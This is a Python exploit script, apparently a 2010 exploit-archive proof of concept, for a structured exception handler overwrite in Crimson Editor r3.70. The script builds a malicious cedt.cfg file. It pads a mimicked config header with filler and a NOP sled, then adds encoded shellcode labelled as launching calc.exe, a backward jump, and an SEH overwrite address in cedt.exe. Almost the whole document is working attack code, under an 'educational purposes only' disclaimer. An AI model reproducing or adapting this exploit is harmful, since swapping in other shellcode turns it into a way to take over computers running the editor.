#!/usr/bin/python
# ###############################################################
# Exploit Title : Crimson Editor r3.70 SEH Overwrite Vulnerability PoC exploit
# Date          : 21/03/2010
# Author        : mr_me
# Bug found by  : sharpe
# Version       : 3.70 Release
# Tested on     : XP SP3 En
# Reference		: http://www.exploit-db.com/exploits/11803
# Greetz to     : Corelan Security Team & sharpe
# http://www.corelan.be:8800/index.php/security/corelan-team-members/
# ###############################################################
# Exploits a parsing vulnerability with its own cfg file.
# create cedt.cfg and copy it to C:\Program Files\Crimson Editor
# Note: I'm not sure if issue has been communicated to vendor so I sent an email
# also, surprised nobody wrote the PoC for this..
# ###############################################################
# Script provided 'as is', without any warranty.
# Use for educational purposes only.
# Do not use this code to do anything illegal !
#
# Note : you are not allowed to edit/modify this code.
# If you do, Corelan cannot be held responsible for any damages this may cause.

print "|------------------------------------------------------------------|"
print "|                         __               __                      |"
print "|   _________  ________  / /___ _____     / /____  ____ _____ ___  |"
print "|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |"
print "| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |"
print "| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |"
print "|                                                                  |"
print "|                                       http://www.corelan.be:8800 |"
print "|                                                                  |"
print "|-------------------------------------------------[ EIP Hunters ]--|"
print "~~> Crimson Editor r3.70 SEH Overwrite Vulnerability PoC exploit <~~"

header = "\x43\x6F\x6E\x66\x69\x67\x75\x72\x61\x74\x69\x6F\x6E\x20\x33\x2E\x37\x30\x20\x42\x65\x74\x61\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x31\x43\x6F\x75\x72\x69\x65\x72\x20\x4E\x65\x77\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x5A\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x31\x46\x69\x78\x65\x64\x53\x79\x73\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x22\x56\x65\x72\x64\x61\x6E\x61\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x22\x41\x72\x69\x61\x6C\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x31\x4C\x75\x63\x69\x64\x61\x20\x43\x6F\x6E\x73\x6F\x6C\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x31\x54\x65\x72\x6D\x69\x6E\x61\x6C\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x31\x43\x6F\x75\x72\x69\x65\x72\x20\x4E\x65\x77\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x22\x56\x65\x72\x64\x61\x6E\x61\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x22\x41\x72\x69\x61\x6C\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x31\x4C\x75\x63\x69\x64\x61\x20\x43\x6F\x6E\x73\x6F\x6C\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x31\x43\x6F\x75\x72\x69\x65\x72\x20\x4E\x65\x77\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x31\x43\x6F\x75\x72\x69\x65\x72\x20\x4E\x65\x77\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x64\x00\x00\x00\x04\x00\x00\x00\x19\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x50\x00\x00\x00\x64\x00\x00\x00\x64\x00\x00\x00\x64\x00\x00\x00\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0B\x00\x00\x00\x24\x28\x46\x69\x6C\x65\x4E\x61\x6D\x65\x29\x00\x00\x00\x00\x1C\x00\x00\x00\x24\x28\x50\x61\x67\x65\x4E\x75\x6D\x62\x65\x72\x29\x20\x2F\x20\x24\x28\x54\x6F\x74\x61\x6C\x50\x61\x67\x65\x29\x0B\x00\x00\x00\x24\x28\x43\x75\x72\x72\x44\x61\x74\x65\x29\x00\x00\x00\x00\x0E\x00\x00\x00\x43\x72\x69\x6D\x73\x6F\x6E\x20\x45\x64\x69\x74\x6F\x72\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x62\x61\x6B\x00\x00\x00\x00\x03\x00\x00\x00\x41\x53\x50\x07\x00\x00\x00\x41\x53\x50\x2E\x53\x50\x43\x07\x00\x00\x00\x41\x53\x50\x2E\x4B\x45\x59\x05\x00\x00\x00\x42\x61\x73\x69\x63\x09\x00\x00\x00\x42\x41\x53\x49\x43\x2E\x53\x50\x43\x09\x00\x00\x00\x42\x41\x53\x49\x43\x2E\x4B\x45\x59\x05\x00\x00\x00\x43\x2F\x43\x2B\x2B\x0D\x00\x00\x00\x43\x50\x4C\x55\x53\x50\x4C\x55\x53\x2E\x53\x50\x43\x0D\x00\x00\x00\x43\x50\x4C\x55\x53\x50\x4C\x55\x53\x2E\x4B\x45\x59\x03\x00\x00\x00\x43\x53\x53\x07\x00\x00\x00\x43\x53\x53\x2E\x53\x50\x43\x07\x00\x00\x00\x43\x53\x53\x2E\x4B\x45\x59\x07\x00\x00\x00\x46\x6F\x72\x74\x72\x61\x6E\x0D\x00\x00\x00\x46\x4F\x52\x54\x52\x41\x4E\x37\x37\x2E\x53\x50\x43\x0D\x00\x00\x00\x46\x4F\x52\x54\x52\x41\x4E\x37\x37\x2E\x4B\x45\x59\x04\x00\x00\x00\x48\x54\x4D\x4C\x08\x00\x00\x00\x48\x54\x4D\x4C\x2E\x53\x50\x43\x08\x00\x00\x00\x48\x54\x4D\x4C\x2E\x4B\x45\x59\x04\x00\x00\x00\x4A\x61\x76\x61\x08\x00\x00\x00\x4A\x41\x56\x41\x2E\x53\x50\x43\x08\x00\x00\x00\x4A\x41\x56\x41\x2E\x4B\x45\x59\x03\x00\x00\x00\x4A\x53\x50\x07\x00\x00\x00\x4A\x53\x50\x2E\x53\x50\x43\x07\x00\x00\x00\x4A\x53\x50\x2E\x4B\x45\x59\x05\x00\x00\x00\x4C\x61\x54\x65\x58\x09\x00\x00\x00\x4C\x41\x54\x45\x58\x2E\x53\x50\x43\x09\x00\x00\x00\x4C\x41\x54\x45\x58\x2E\x4B\x45\x59\x06\x00\x00\x00\x4D\x61\x74\x6C\x61\x62\x0A\x00\x00\x00\x4D\x41\x54\x4C\x41\x42\x2E\x53\x50\x43\x0A\x00\x00\x00\x4D\x41\x54\x4C\x41\x42\x2E\x4B\x45\x59\x06\x00\x00\x00\x50\x61\x73\x63\x61\x6C\x0A\x00\x00\x00\x50\x41\x53\x43\x41\x4C\x2E\x53\x50\x43\x0A\x00\x00\x00\x50\x41\x53\x43\x41\x4C\x2E\x4B\x45\x59\x04\x00\x00\x00\x50\x65\x72\x6C\x08\x00\x00\x00\x50\x45\x52\x4C\x2E\x53\x50\x43\x08\x00\x00\x00\x50\x45\x52\x4C\x2E\x4B\x45\x59\x03\x00\x00\x00\x50\x48\x50\x07\x00\x00\x00\x50\x48\x50\x2E\x53\x50\x43\x07\x00\x00\x00\x50\x48\x50\x2E\x4B\x45\x59\x06\x00\x00\x00\x50\x4C\x2F\x53\x51\x4C\x09\x00\x00\x00\x50\x4C\x53\x51\x4C\x2E\x53\x50\x43\x09\x00\x00\x00\x50\x4C\x53\x51\x4C\x2E\x4B\x45\x59\x06\x00\x00\x00\x50\x79\x74\x68\x6F\x6E\x0A\x00\x00\x00\x50\x59\x54\x48\x4F\x4E\x2E\x53\x50\x43\x0A\x00\x00\x00\x50\x59\x54\x48\x4F\x4E\x2E\x4B\x45\x59\x06\x00\x00\x00\x54\x63\x6C\x2F\x54\x6B\x09\x00\x00\x00\x54\x43\x4C\x54\x4B\x2E\x53\x50\x43\x09\x00\x00\x00\x54\x43\x4C\x54\x4B\x2E\x4B\x45\x59\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x09\x00\x00\x00\x41\x6C\x6C\x20\x46\x69\x6C\x65\x73\x03\x00\x00\x00\x2A\x2E\x2A\x00\x00\x00\x00\x0A\x00\x00\x00\x54\x65\x78\x74\x20\x46\x69\x6C\x65\x73\x17\x00\x00\x00\x2A\x2E\x74\x78\x74\x3B\x2A\x2E\x6C\x6F\x67\x3B\x2A\x2E\x62\x61\x74\x3B\x2A\x2E\x69\x6E\x69\x03\x00\x00\x00\x74\x78\x74\x0A\x00\x00\x00\x48\x54\x4D\x4C\x20\x46\x69\x6C\x65\x73\x1A\x00\x00\x00\x2A\x2E\x68\x74\x6D\x6C\x3B\x2A\x2E\x68\x74\x6D\x3B\x2A\x2E\x73\x68\x74\x6D\x6C\x3B\x2A\x2E\x63\x73\x73\x04\x00\x00\x00\x68\x74\x6D\x6C\x0B\x00\x00\x00\x43\x2F\x43\x2B\x2B\x20\x46\x69\x6C\x65\x73\x17\x00\x00\x00\x2A\x2E\x63\x3B\x2A\x2E\x63\x63\x3B\x2A\x2E\x63\x70\x70\x3B\x2A\x2E\x70\x63\x3B\x2A\x2E\x68\x03\x00\x00\x00\x63\x70\x70\x0A\x00\x00\x00\x4A\x61\x76\x61\x20\x46\x69\x6C\x65\x73\x0C\x00\x00\x00\x2A\x2E\x6A\x61\x76\x61\x3B\x2A\x2E\x6A\x61\x76\x04\x00\x00\x00\x6A\x61\x76\x61\x0A\x00\x00\x00\x50\x65\x72\x6C\x20\x46\x69\x6C\x65\x73\x16\x00\x00\x00\x2A\x2E\x70\x6C\x3B\x2A\x2E\x70\x6D\x3B\x2A\x2E\x70\x65\x72\x6C\x3B\x2A\x2E\x63\x67\x69\x02\x00\x00\x00\x70\x6C\x0D\x00\x00\x00\x46\x6F\x72\x74\x72\x61\x6E\x20\x46\x69\x6C\x65\x73\x1B\x00\x00\x00\x2A\x2E\x66\x3B\x2A\x2E\x66\x6F\x72\x3B\x2A\x2E\x66\x37\x37\x3B\x2A\x2E\x66\x39\x30\x3B\x2A\x2E\x66\x39\x35\x01\x00\x00\x00\x66\x09\x00\x00\x00\x50\x48\x50\x20\x46\x69\x6C\x65\x73\x1B\x00\x00\x00\x2A\x2E\x70\x68\x70\x3B\x2A\x2E\x70\x68\x74\x6D\x6C\x3B\x2A\x2E\x70\x68\x70\x33\x3B\x2A\x2E\x70\x68\x70\x34\x03\x00\x00\x00\x70\x68\x70\x09\x00\x00\x00\x4A\x53\x50\x20\x46\x69\x6C\x65\x73\x14\x00\x00\x00\x2A\x2E\x6A\x73\x70\x3B\x2A\x2E\x6A\x68\x74\x6D\x6C\x3B\x2A\x2E\x6A\x61\x76\x61\x03\x00\x00\x00\x6A\x73\x70\x0B\x00\x00\x00\x4C\x61\x54\x65\x58\x20\x46\x69\x6C\x65\x73\x0B\x00\x00\x00\x2A\x2E\x74\x65\x78\x3B\x2A\x2E\x73\x74\x79\x03\x00\x00\x00\x74\x65\x78"

# calc.exe
sc = ("\x89\xe1\xd9\xee\xd9\x71\xf4\x58\x50\x59\x49\x49\x49\x49"
"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56"
"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41"
"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42"
"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a"
"\x48\x47\x34\x43\x30\x45\x50\x45\x50\x4c\x4b\x51\x55\x47"
"\x4c\x4c\x4b\x43\x4c\x45\x55\x42\x58\x45\x51\x4a\x4f\x4c"
"\x4b\x50\x4f\x45\x48\x4c\x4b\x51\x4f\x51\x30\x43\x31\x4a"
"\x4b\x51\x59\x4c\x4b\x50\x34\x4c\x4b\x43\x31\x4a\x4e\x46"
"\x51\x49\x50\x4c\x59\x4e\x4c\x4d\x54\x49\x50\x42\x54\x45"
"\x57\x49\x51\x49\x5a\x44\x4d\x43\x31\x48\x42\x4a\x4b\x4c"
"\x34\x47\x4b\x50\x54\x47\x54\x45\x54\x43\x45\x4b\x55\x4c"
"\x4b\x51\x4f\x47\x54\x45\x51\x4a\x4b\x45\x36\x4c\x4b\x44"
"\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x43\x31\x4a\x4b\x4c"
"\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4c\x49\x51\x4c\x46"
"\x44\x44\x44\x48\x43\x51\x4f\x50\x31\x4a\x56\x45\x30\x50"
"\x56\x42\x44\x4c\x4b\x51\x56\x50\x30\x4c\x4b\x51\x50\x44"
"\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x43\x58\x45"
"\x58\x4b\x39\x4a\x58\x4d\x53\x49\x50\x42\x4a\x50\x50\x43"
"\x58\x4a\x50\x4d\x5a\x44\x44\x51\x4f\x45\x38\x4a\x38\x4b"
"\x4e\x4c\x4a\x44\x4e\x50\x57\x4b\x4f\x4d\x37\x42\x43\x43"
"\x51\x42\x4c\x42\x43\x43\x30\x41\x41");

print "[+] Building payload.."

crash = "\x41" * 7147 #7947
crash += "\x90" * 20
crash += sc
crash += "\x41" * (7947-len(crash))
crash += "\xe9\xe0\xfc\xff\xff"
crash += "\xeb\xf9\x90\x90"
crash += "\xbd\x32\x46\x00" # [cedt.exe]

print "[+] Writing cedt.cfg file"
exploit = header + crash
pwnfile = open('cedt.cfg','w');
pwnfile.write(exploit);
pwnfile.close()
print "[+] Exploit file created!"